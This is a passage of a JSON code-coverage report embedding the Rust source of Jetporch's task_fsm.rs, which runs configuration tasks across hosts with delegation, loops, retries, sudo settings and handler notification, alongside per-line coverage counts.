address":[],"length":0,"stats":{"Line":19}},{"line":67,"address":[],"length":0,"stats":{"Line":19}},{"line":68,"address":[],"length":0,"stats":{"Line":19}},{"line":71,"address":[],"length":0,"stats":{"Line":19}},{"line":72,"address":[],"length":0,"stats":{"Line":19}},{"line":75,"address":[],"length":0,"stats":{"Line":19}},{"line":76,"address":[],"length":0,"stats":{"Line":19}},{"line":79,"address":[],"length":0,"stats":{"Line":19}},{"line":80,"address":[],"length":0,"stats":{"Line":19}},{"line":83,"address":[],"length":0,"stats":{"Line":19}}],"covered":28,"coverable":30},{"path":["/","Users","wings","projects","jetpack","src","playbooks","task_fsm.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::registry::list::Task;\nuse crate::connection::connection::Connection;\nuse crate::handle::handle::TaskHandle;\nuse crate::playbooks::traversal::RunState;\nuse crate::inventory::hosts::Host;\nuse crate::playbooks::traversal::HandlerMode;\nuse crate::playbooks::language::Play;\nuse crate::tasks::request::SudoDetails;\nuse crate::tasks::*;\nuse crate::handle::template::BlendTarget;\nuse crate::playbooks::templar::TemplateMode;\nuse crate::tasks::logic::template_items;\nuse std::sync::{Arc,RwLock,Mutex};\nuse std::collections::HashMap;\nuse rayon::prelude::*;\nuse std::{thread, time};\n\n// this module contains the guts of running tasks inside per-host threads\n// while the actual core finite state machine is not terribly complicated\n// various logical constructs in the language tend to cause lots of exceptions\n//\n// FIXME: this will be gradually refactored over time\n\npub fn fsm_run_task(run_state: \u0026Arc\u003cRunState\u003e, play: \u0026Play, task: \u0026Task, are_handlers: HandlerMode) -\u003e Result\u003c(), String\u003e {\n\n    // if running in check mode various functions will short circuit early\n    let check =  run_state.visitor.read().unwrap().is_check_mode();\n\n    // the hosts to configure are not those specified in the batch but the subset of those that have not yet failed\n    let hosts : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e = run_state.context.read().unwrap().get_remaining_hosts();\n    let mut host_objects : Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e = Vec::new();\n    for (_,v) in hosts { host_objects.push(Arc::clone(\u0026v)); }\n\n    // use rayon to process hosts in different threads\n    let _total : i64 = host_objects.par_iter().map(|host| {\n\n        // get the connection to each host, which should be left open until the play ends\n        let connection_result = run_state.connection_factory.read().unwrap().get_connection(\u0026run_state.context, \u0026host);\n        match connection_result {\n            Ok(_)  =\u003e {\n                let connection = connection_result.unwrap();\n                run_state.visitor.read().unwrap().on_host_task_start(\u0026run_state.context, \u0026host);\n                // the actual task is invoked here\n                let task_response = run_task_on_host(\u0026run_state,connection,\u0026host,play,task,are_handlers);\n\n                match task_response {\n                    Ok(x) =\u003e {\n                        match check {\n                            // output slightly differs in check vs non-check modes\n                            false =\u003e run_state.visitor.read().unwrap().on_host_task_ok(\u0026run_state.context, \u0026x, \u0026host),\n                            true =\u003e run_state.visitor.read().unwrap().on_host_task_check_ok(\u0026run_state.context, \u0026x, \u0026host)\n                        }\n                    }\n                    Err(x) =\u003e {\n                        // hosts with task failures are removed from the pool\n                        run_state.context.write().unwrap().fail_host(\u0026host);\n                        run_state.visitor.read().unwrap().on_host_task_failed(\u0026run_state.context, \u0026x, \u0026host);\n                    },\n                }\n            },\n            Err(x) =\u003e {\n                // hosts with connection failures are removed from the pool\n                run_state.visitor.read().unwrap().debug_host(\u0026host, \u0026x);\n                run_state.context.write().unwrap().fail_host(\u0026host);\n                run_state.visitor.read().unwrap().on_host_connect_failed(\u0026run_state.context, \u0026host);\n            }\n        }\n        // rayon needs some math to add up, hence the 1. It seems to short-circuit without some work to do.\n        return 1;\n\n    }).sum();\n    return Ok(());\n}\n\nfn get_actual_connection(run_state: \u0026Arc\u003cRunState\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, task: \u0026Task, input_connection: Arc\u003cMutex\u003cdyn Connection\u003e\u003e) -\u003e Result\u003c(Option\u003cString\u003e,Arc\u003cMutex\u003cdyn Connection\u003e\u003e), String\u003e {\n    \n    // usually the connection we already have is the one we will use, but this is not the case for using the delegate_to feature\n    // this is a bit complex...\n\n    return match task.get_with() {\n        \n        // if the task has a with section then the task might be delegated\n        Some(task_with) =\u003e match task_with.delegate_to {\n\n            // we have found the delegate_to keyword\n            Some(pre_delegate) =\u003e {\n\n                // we need to store the variable 'delegate_host' into the host's facts storage so it can be used in module parameters.\n                let hn = host.read().unwrap().name.clone();\n                let mut mapping = serde_yaml::Mapping::new();\n                mapping.insert(serde_yaml::Value::String(String::from(\"delegate_host\")), serde_yaml::Value::String(hn.clone()));\n                host.write().unwrap().update_facts2(mapping);\n                \n                // the delegate_to parameter could be a variable\n                let delegate = run_state.context.read().unwrap().render_template(\u0026pre_delegate, host, BlendTarget::NotTemplateModule, TemplateMode::Strict)?;\n\n                if delegate.eq(\u0026hn.clone()) {\n                    // delegating to the same host will deadlock since the connection is wrapped in a mutex, \n                    // so just return the original connection if that is requested\n                    return Ok((None, input_connection))\n                }\n                else if delegate.eq(\u0026String::from(\"localhost\")) {\n                    // localhost delegation has some security implications (see docs) so require a CLI flag for access\n                    if run_state.allow_localhost_delegation {\n                        return Ok((Some(delegate.clone()), run_state.connection_factory.read().unwrap().get_local_connection(\u0026run_state.context)?))\n                    } else {\n                        return Err(format!(\"localhost delegation has potential security implementations, pass --allow-localhost-delegation to sign off\"));\n                    }\n                }\n                else {\n                    // with some pre-checks out of the way, allow delegation to the host if it's in inventory\n                    let has_host = run_state.inventory.read().unwrap().has_host(\u0026delegate);\n                    if ! has_host {\n                        return Err(format!(\"cannot delegate to a host not found in inventory: {}\", delegate));\n                    }\n                    let host = run_state.inventory.read().unwrap().get_host(\u0026delegate);\n                    return Ok((Some(delegate.clone()), run_state.connection_factory.read().unwrap().get_connection(\u0026run_state.context, \u0026host)?));\n                } \n            },\n            // there was no delegate keyword, use the original connection\n            None =\u003e Ok((None, input_connection))\n        },\n        // there was no 'with' block, use teh original connection\n        None =\u003e Ok((None, input_connection))\n    };\n}\n\nfn run_task_on_host(\n    run_state: \u0026Arc\u003cRunState\u003e,\n    input_connection: Arc\u003cMutex\u003cdyn Connection\u003e\u003e,\n    host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e,\n    play: \u0026Play, \n    task: \u0026Task,\n    are_handlers: HandlerMode) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n    // to run a task we must first validate the object, which renders the YAML inputs into versions where the program\n    // has applied more pre-processing\n    let validate = TaskRequest::validate();\n\n    // consider the use of the delegate_to keyword, if provided\n    let gac_result = get_actual_connection(run_state, host, task, Arc::clone(\u0026input_connection));\n\n    let (delegated, connection, handle) = match gac_result {\n        // construct the TaskHandle if the original connection is to be used\n        Ok((None, ref conn)) =\u003e (\n            None, \n            conn, \n            Arc::new(TaskHandle::new(Arc::clone(run_state), Arc::clone(conn), Arc::clone(host)))\n        ),\n        // construct the TaskHandle if a delegate connection is to be used\n        Ok((Some(delegate), ref conn)) =\u003e (\n            Some(delegate.clone()), \n            conn, \n            Arc::new(TaskHandle::new(Arc::clone(run_state), Arc::clone(conn), Arc::clone(host)))\n        ),\n        // something went wrong when processing delegates, create a throw-away handle just so we can use the response functions\n        Err(msg) =\u003e {\n            let tmp_handle = Arc::new(TaskHandle::new(Arc::clone(run_state), Arc::clone(\u0026input_connection), Arc::clone(host)));\n            return Err(tmp_handle.response.is_failed(\u0026validate, \u0026msg));\n        }\n    };\n\n    // if we are delegating, tell the user\n    if delegated.is_some() {\n        run_state.visitor.read().unwrap().on_host_delegate(host, \u0026delegated.unwrap());\n    }\n\n    // process the YAML inputs of the task and turn them into something we can  use\n    // initially we run this in 'template off' mode which returns basically junk\n    // but allows us to get the 'items' data off the collection. \n    let evaluated = task.evaluate(\u0026handle, \u0026validate, TemplateMode::Off)?;\n\n    if evaluated.with.is_some() {\n        let condition = \u0026evaluated.with.as_ref().as_ref().unwrap().condition; // lol rust\n        if condition.is_some() {\n            let cond = handle.template.test_condition(\u0026validate, TemplateMode::Strict, \u0026condition.as_ref().unwrap())?;\n            if ! cond {\n                return Ok(handle.response.is_skipped(\u0026Arc::clone(\u0026validate)));\n            }\n        }\n    }\n\n    // see if we are iterating over a list of items or not\n    let items_input = match evaluated.with.is_some() {\n        true =\u003e \u0026evaluated.with.as_ref().as_ref().unwrap().items,\n        false =\u003e \u0026None\n    };\n\n    // mapping to store the 'item' variable when using 'with_items'\n    let mut mapping = serde_yaml::Mapping::new();\n\n    // storing the last result of the items loop so we always have something to return\n    // if a failure occurs it will be returned immediately\n    let mut last : Option\u003cResult\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e\u003e = None;\n\n    // even if we are not iterating over a list of items, make a list of one item to simplify the logic\n    let evaluated_items = template_items(\u0026handle, \u0026validate, TemplateMode::Strict, \u0026items_input)?;\n\n    // walking over each item or just the single task if 'with_items' was not used\n    for item in evaluated_items.iter() {\n            \n        // store the 'items' variable for use in module parameters\n        mapping.insert(serde_yaml::Value::String(String::from(\"item\")), item.clone());\n        host.write().unwrap().update_facts2(mapping.clone());\n\n        // re-evaluate the task, allowing the 'items' to be plugged in.\n        let evaluated = task.evaluate(\u0026handle, \u0026validate, TemplateMode::Strict)?;\n\n        // see if there is any retry or delay logic in the task\n        let mut retries = match evaluated.and.as_ref().is_some() {\n            false =\u003e 0, true =\u003e evaluated.and.as_ref().as_ref().unwrap().retry\n        };\n            let delay = match evaluated.and.as_ref().is_some() {\n            false =\u003e 1, true =\u003e evaluated.and.as_ref().as_ref().unwrap().delay\n        };\n    \n        // run the task as many times as defined by retry logic\n        loop {\n            \n            // here we finally call the actual task, everything around this is just support\n            // for delegation, loops, and retries!\n            match run_task_on_host_inner(run_state, \u0026connection, host, play, task, are_handlers, \u0026handle, \u0026validate, \u0026evaluated) {\n                Err(e) =\u003e match retries {\n                    // retries are used up\n                    0 =\u003e { return Err(e); },\n                    // we have retries left\n                    _ =\u003e { \n                        retries = retries - 1;\n                        run_state.visitor.read().unwrap().on_host_task_retry(\u0026run_state.context, host, retries, delay);\n                        if delay \u003e 0 {\n                            let duration = time::Duration::from_secs(delay);\n                            thread::sleep(duration);\n                        }\n                    }\n                },\n                Ok(x) =\u003e { last = Some(Ok(x)); break }\n            }\n        }\n    \n    }\n\n    // looping over a list of no items should be impossible unless someone passed in a variable that was\n    // an empty list\n    if last.is_some() {\n        return last.unwrap();\n    }\n    else {\n        return Err(handle.response.is_failed(\u0026validate, \u0026String::from(\"with/items contained no entries\")));    \n    }\n\n}\n\n// the \"on this host\" method body from _task\nfn run_task_on_host_inner(\n    run_state: \u0026Arc\u003cRunState\u003e,\n    _connection: \u0026Arc\u003cMutex\u003cdyn Connection\u003e\u003e,\n    host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e,\n    play: \u0026Play, \n    _task: \u0026Task,\n    are_handlers: HandlerMode, \n    handle: \u0026Arc\u003cTaskHandle\u003e,\n    validate: \u0026Arc\u003cTaskRequest\u003e,\n    evaluated: \u0026EvaluatedTask) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n    let play_count = run_state.context.read().unwrap().play_count;\n    let modify_mode = ! run_state.visitor.read().unwrap().is_check_mode();\n\n    // access any pre and post-task modifier logic\n    let action = \u0026evaluated.action;\n    let pre_logic = \u0026evaluated.with;\n    let post_logic = \u0026evaluated.and;\n\n    // get the sudo settings from the play if available, if not see if they were set from the CLI\n    let mut sudo : Option\u003cString\u003e = match play.sudo.is_some() {\n        true =\u003e play.sudo.clone(),\n        // minor FIXME: parameters like this are usually set on the run_state\n        false =\u003e run_state.context.read().unwrap().sudo.clone() \n    };\n    // see if the sudo template is configured, if not use the most basic default\n    let sudo_template = match \u0026play.sudo_template {\n        None =\u003e String::from(\"/usr/bin/sudo -u '{{jet_sudo_user}}' {{jet_command}}\"),\n        Some(x) =\u003e x.clone()\n    };\n    \n    // is 'with' provided?\n    if pre_logic.is_some() {\n        let logic = pre_logic.as_ref().as_ref().unwrap();\n        let my_host = host.read().unwrap();\n        if are_handlers == HandlerMode::Handlers  {\n            // if we are running handlers at the moment, skip any un-notified handlers\n            if ! my_host.is_notified(play_count, \u0026logic.subscribe.as_ref().unwrap().clone()) {\n                return Ok(handle.response.is_skipped(\u0026Arc::clone(\u0026validate))); \n            }\n        }\n        \n        // if sudo was requested on the specific task override any sudo computations above\n        if logic.sudo.is_some() {\n            sudo = Some(logic.sudo.as_ref().unwrap().clone());\n        }\n    }\n\n    let sudo_details = SudoDetails {\n        user     : sudo.clone(),\n        template : sudo_template.clone()\n    };\n\n    // we're about to get to the task finite state machine guts.\n    // this looks like overkill but there's a lot of extra checking to make sure modules\n    // don't return the wrong states, even when returning an error, to prevent\n    // unpredictability in the program\n\n    let query = TaskRequest::query(\u0026sudo_details);\n\n    // invoke the resource and see what actions it thinks need to be performed\n\n    let qrc = action.dispatch(\u0026handle, \u0026query);\n\n    // in check mode we short-circuit evaluation early, except for passive modules\n    // like 'facts'\n\n    if run_state.visitor.read().unwrap().is_check_mode() {\n        match qrc {\n            Ok(ref qrc_ok) =\u003e match qrc_ok.status {\n                TaskStatus::NeedsPassive =\u003e { /* allow modules like !facts or set to execute */ },\n                _ =\u003e { return qrc; }\n            },\n            _ =\u003e {}\n        }\n    }\n\n    // with the query completed, what action to perform next depends on the query results\n\n    let prelim_result : Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e = match qrc {\n        Ok(ref qrc_ok) =\u003e match qrc_ok.status {\n\n            // matched indicates we don't need to do anything\n            TaskStatus::IsMatched =\u003e {\n                Ok(handle.response.is_matched(\u0026Arc::clone(\u0026query)))\n            },\n\n            TaskStatus::NeedsCreation =\u003e match modify_mode {\n                true =\u003e {\n                    let req = TaskRequest::create(\u0026sudo_details);\n                    let crc = action.dispatch(\u0026handle, \u0026req);\n                    match crc {\n                        Ok(ref crc_ok) =\u003e match crc_ok.status {\n                            TaskStatus::IsCreated =\u003e crc,\n                            // these are all module coding errors, should they occur, and cannot happen in normal operation\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on create): {:?}\", crc); }\n                        },\n                        Err(ref crc_err) =\u003e match crc_err.status {\n                            TaskStatus::Failed  =\u003e crc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on create), {:?}\", crc); }\n                        }\n                    }\n                },\n                false =\u003e Ok(handle.response.is_created(\u0026Arc::clone(\u0026query)))\n            },\n\n            TaskStatus::NeedsRemoval =\u003e match modify_mode {\n                true =\u003e {\n                    let req = TaskRequest::remove(\u0026sudo_details);\n                    let rrc = action.dispatch(\u0026handle, \u0026req);\n                    match rrc {\n                        Ok(ref rrc_ok) =\u003e match rrc_ok.status {\n                            TaskStatus::IsRemoved =\u003e rrc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on remove): {:?}\", rrc); }\n                        },\n                        Err(ref rrc_err) =\u003e match rrc_err.status {\n                            TaskStatus::Failed  =\u003e rrc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on remove): {:?}\", rrc); }\n                        }\n                    }\n                },\n                false =\u003e Ok(handle.response.is_removed(\u0026Arc::clone(\u0026query))),\n            },\n\n            TaskStatus::NeedsModification =\u003e match modify_mode {\n                true =\u003e {\n                    let req = TaskRequest::modify(\u0026sudo_details, qrc_ok.changes.clone());\n                    let mrc = action.dispatch(\u0026handle, \u0026req);\n                    match mrc {\n                        Ok(ref mrc_ok) =\u003e match mrc_ok.status {\n                            TaskStatus::IsModified =\u003e mrc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on modify): {:?}\", mrc); }\n                        }\n                        Err(ref mrc_err)  =\u003e match mrc_err.status {\n                            TaskStatus::Failed  =\u003e mrc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on modify): {:?}\", mrc); }\n                        }\n                    }\n                },\n                false =\u003e Ok(handle.response.is_modified(\u0026Arc::clone(\u0026query), qrc_ok.changes.clone()))\n            },\n\n            TaskStatus::NeedsExecution =\u003e match modify_mode {\n                true =\u003e {\n                    let req = TaskRequest::execute(\u0026sudo_details);\n                    let erc = action.dispatch(\u0026handle, \u0026req);\n                    match erc {\n                        Ok(ref erc_ok) =\u003e match erc_ok.status {\n                            TaskStatus::IsExecuted =\u003e erc,\n                            TaskStatus::IsPassive =\u003e erc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on execute): {:?}\", erc); }\n                        }\n                        Err(ref erc_err)  =\u003e match erc_err.status {\n                            TaskStatus::Failed  =\u003e erc,\n                            _ =\u003e { panic!(\"module internal fsm state invalid (on execute): {:?}\", erc); }\n                        }\n                    }\n                },\n                false =\u003e Ok(handle.response.is_executed(\u0026Arc::clone(\u0026query)))\n            },\n\n            TaskStatus::NeedsPassive =\u003e {\n                let req = TaskRequest::passive(\u0026sudo_details);\n                let prc = action.dispatch(\u0026handle, \u0026req);\n                match prc {\n                    Ok(ref prc_ok) =\u003e match prc_ok.status {\n                        TaskStatus::IsPassive =\u003e prc,\n                        _ =\u003e { panic!(\"module internal fsm state invalid (on passive): {:?}\", prc); }\n                    }\n                    Err(ref prc_err)  =\u003e match prc_err.status {\n                        TaskStatus::Failed  =\u003e prc,\n                        _ =\u003e { panic!(\"module internal fsm state invalid (on passive): {:?}\", prc); }\n                    }\n                }\n            },\n\n            // these panic states should never really happen unless there is a module coding error\n            // it is unacceptable for a module to deliberately panic, they should\n            // always return a TaskResponse.\n\n            TaskStatus::Failed =\u003e { panic!(\"module returned failure inside an Ok(): {:?}\", qrc); },           \n            _ =\u003e { panic!(\"module internal fsm state unknown (on query): {:?}\", qrc); }\n\n        },\n        Err(x) =\u003e match x.status {\n            TaskStatus::Failed =\u003e Err(x),\n            _ =\u003e { panic!(\"module returned a non-failure code inside an Err: {:?}\", x); }\n        }\n    };\n\n    // now that we've got a result, whether we use that result depends\n    // on whether ignore_errors was set.\n\n    let result = match prelim_result {\n        Ok(x) =\u003e Ok(x), \n        Err(y) =\u003e  {\n            if post_logic.is_some() {\n                let logic = post_logic.as_ref().as_ref().unwrap();\n                match logic.ignore_errors {\n                    true =\u003e Ok(y),\n                    false =\u003e Err(y)\n                }\n            }\n            else {\n                Err(y)\n            }\n        }\n    };\n\n    // if and/notify is present, notify handlers when changed actions are seen\n\n    if result.is_ok() \u0026\u0026 post_logic.is_some() {\n        let logic = post_logic.as_ref().as_ref().unwrap();\n        if are_handlers == HandlerMode::NormalTasks \u0026\u0026 result.is_ok() \u0026\u0026 logic.notify.is_some() {\n            let notify = logic.notify.as_ref().unwrap().clone();\n            let status = \u0026result.as_ref().unwrap().status;\n            match status {\n                TaskStatus::IsCreated | TaskStatus::IsModified | TaskStatus::IsRemoved | TaskStatus::IsExecuted =\u003e {\n                    run_state.visitor.read().unwrap().on_notify_handler(host, \u0026notify.clone());\n                    host.write().unwrap().notify(play_count, \u0026notify.clone());\n                },\n                _ =\u003e { }\n            }\n        }\n    }\n\n    // ok, we're done, whew\n\n    return result;\n}\n","traces":[{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":223,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":244,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":248,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":264,"address":[],"length":0,"stats":{"Line":0}},{"line":270,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[],"length":0,"stats":{"Line":0}},{"line":286,"address":[],"length":0,"stats":{"Line":0}},{"line":287,"address":[],"length":0,"stats":{"Line":0}},{"line":290,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":296,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":298,"address":[],"length":0,"stats":{"Line":0}},{"line":302,"address":[],"length":0,"stats":{"Line":0}},{"line":303,"address":[],"length":0,"stats":{"Line":0}},{"line":304,"address":[],"length":0,"stats":{"Line":0}},{"line":305,"address":[],"length":0,"stats":{"Line":0}},{"line":307,"address":[],"length":0,"stats":{"Line":0}},{"line":308,"address":[],"length":0,"stats":{"Line":0}},{"line":313,"address":[],"length":0,"stats":{"Line":0}},{"line":314,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":320,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":332,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":338,"address":[],"length":0,"stats":{"Line":0}},{"line":339,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":341,"address":[],"length":0,"stats":{"Line":0}},{"line":343,"address":[],"length":0,"stats":{"Line":0}},{"line":349,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":357,"address":[],"length":0,"stats":{"Line":0}},{"line":359,"address":[],"length":0,"stats":{"Line":0}},{"line":360,"address":[],"length":0,"stats":{"Line":0}},{"line":361,"address":[],"length":0,"stats":{"Line":0}},{"line":362,"address":[],"length":0,"stats":{"Line":0}},{"line":363,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":367,"address":[],"length":0,"stats":{"Line":0}},{"line":368,"address":[],"length":0,"stats":{"Line":0}},{"line":369,"address":[],"length":0,"stats":{"Line":0}},{"line":373,"address":[],"length":0,"stats":{"Line":0}},{"line":376,"address":[],"length":0,"stats":{"Line":0}},{"line":378,"address":[],"length":0,"stats":{"Line":0}},{"line":379,"address":[],"length":0,"stats":{"Line":0}},{"line":380,"address":[],"length":0,"stats":{"Line":0}},{"line":381,"address":[],"length":0,"stats":{"Line":0}},{"line":382,"address":[],"length":0,"stats":{"Line":0}},{"line":383,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":386,"address":[],"length":0,"stats":{"Line":0}},{"line":387,"address":[],"length":0,"stats":{"Line":0}},{"line":391,"address":[],"length":0,"stats":{"Line":0}},{"line":394,"address":[],"length":0,"stats":{"Line":0}},{"line":396,"address":[],"length":0,"stats":{"Line":0}},{"line":397,"address":[],"length":0,"stats":{"Line":0}},{"line":398,"address":[],"length":0,"stats":{"Line":0}},{"line":399,"address":[],"length":0,"stats":{"Line":0}},{"line":400,"address":[],"length":0,"stats":{"Line":0}},{"line":401,"address":[],"length":0,"stats":{"Line":0}},{"line":403,"address":[],"length":0,"stats":{"Line":0}},{"line":404,"address":[],"length":0,"stats":{"Line":0}},{"line":405,"address":[],"length":0,"stats":{"Line":0}},{"line":409,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":414,"address":[],"length":0,"stats":{"Line":0}},{"line":415,"address":[],"length":0,"stats":{"Line":0}},{"line":416,"address":[],"length":0,"stats":{"Line":0}},{"line":417,"address":[],"length":0,"stats":{"Line":0}},{"line":418,"address":[],"length":0,"stats":{"Line":0}},{"line":419,"address":[],"length":0,"stats":{"Line":0}},{"line":420,"address":[],"length":0,"stats":{"Line":0}},{"line":422,"address":[],"length":0,"stats":{"Line":0}},{"line":423,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":428,"address":[],"length":0,"stats":{"Line":0}},{"line":432,"address":[],"length":0,"stats":{"Line":0}},{"line":433,"address":[],"length":0,"stats":{"Line":0}},{"line":434,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":436,"address":[],"length":0,"stats":{"Line":0}},{"line":437,"address":[],"length":0,"stats":{"Line":0}},{"line":439,"address":[],"length":0,"stats":{"Line":0}},{"li